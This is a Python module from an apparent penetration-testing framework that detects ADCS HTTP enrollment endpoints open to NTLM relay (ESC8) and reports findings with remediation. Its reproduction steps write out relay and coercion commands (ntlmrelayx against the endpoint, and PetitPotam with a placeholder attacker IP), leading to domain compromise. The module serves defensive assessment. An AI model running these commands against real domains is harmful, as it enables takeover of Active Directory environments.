"""ESC8 — NTLM relay to ADCS HTTP enrollment endpoint (PetitPotam → cert)."""
from __future__ import annotations
import asyncio, sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
CVSS40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"

class Esc8Check(BaseModule):
    NAME = "esc8_check"
    DESCRIPTION = "ESC8: HTTP enrollment endpoint — NTLM relay to request certificates"
    PHASE = 11
    TAGS = ["adcs", "esc8", "ntlm-relay"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        dc_ip = self.config.extra.get("dc", self.config.target)
        domain = self.config.extra.get("domain", "")
        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        cas = self.config.extra.get("adcs_cas", [])
        targets = [ca.get("host", dc_ip) for ca in cas] if cas else [dc_ip]

        import aiohttp
        for host in targets:
            await self.rate_limit()
            # Check for certsrv HTTP enrollment endpoint
            for path in ["/certsrv/", "/certsrv/certfnsh.asp"]:
                for scheme in ["http", "https"]:
                    try:
                        url = f"{scheme}://{host}{path}"
                        async with aiohttp.ClientSession(
                            connector=aiohttp.TCPConnector(ssl=False),
                            timeout=aiohttp.ClientTimeout(total=5)
                        ) as session:
                            async with session.get(url) as resp:
                                if resp.status in (200, 401, 403):
                                    # Check if NTLM auth is accepted (401 with WWW-Authenticate: NTLM)
                                    auth_header = resp.headers.get("WWW-Authenticate", "")
                                    ntlm_enabled = "NTLM" in auth_header or "Negotiate" in auth_header
                                    has_epa = "channel" in auth_header.lower()  # EPA binding

                                    if resp.status == 200 or ntlm_enabled:
                                        severity = Severity.CRITICAL if ntlm_enabled and not has_epa else Severity.HIGH
                                        ev = Evidence(
                                            request_raw=f"GET {url}",
                                            response_raw=f"Status: {resp.status}, Auth: {auth_header[:100]}",
                                            extra={"host": host, "url": url, "ntlm": ntlm_enabled, "epa": has_epa})
                                        self.new_finding(
                                            title=f"ESC8 — ADCS HTTP Enrollment at {url}" + (" [NTLM RELAY]" if ntlm_enabled else ""),
                                            severity=severity,
                                            description=(
                                                f"ADCS HTTP enrollment endpoint found at {url}.\n"
                                                f"NTLM authentication: {'YES' if ntlm_enabled else 'No'}\n"
                                                f"EPA (Extended Protection): {'YES' if has_epa else 'NO'}\n\n"
                                                + ("This endpoint is vulnerable to NTLM relay attacks. "
                                                   "An attacker can coerce authentication (PetitPotam, PrinterBug) "
                                                   "from a DC and relay it to this endpoint to request a certificate "
                                                   "as the DC machine account → DCSync → full domain compromise."
                                                   if ntlm_enabled and not has_epa else
                                                   "HTTP enrollment is enabled but EPA may mitigate relay attacks.")
                                            ),
                                            reproduction_steps=[
                                                "# Start NTLM relay:",
                                                f"ntlmrelayx.py -t {url} --adcs --template DomainController",
                                                "# Coerce authentication:",
                                                f"PetitPotam.py attacker_ip {dc_ip}",
                                            ],
                                            remediation=(
                                                "1. Disable HTTP enrollment: Remove IIS certsrv binding\n"
                                                "2. Enable EPA: Set Extended Protection to Required in IIS\n"
                                                "3. Require HTTPS-only enrollment\n"
                                                "4. Enable Require SSL on certsrv virtual directory"
                                            ),
                                            references=["CWE-294", "SpecterOps ESC8", "PetitPotam"],
                                            evidence=ev, cvss_v31_vector=CVSS, cvss_v40_vector=CVSS40, target=dc_ip)
                                        break
                    except Exception:
                        continue

        return self._make_result(start)

class TestEsc8Check:
    def test_phase(self) -> None: assert Esc8Check.PHASE == 11
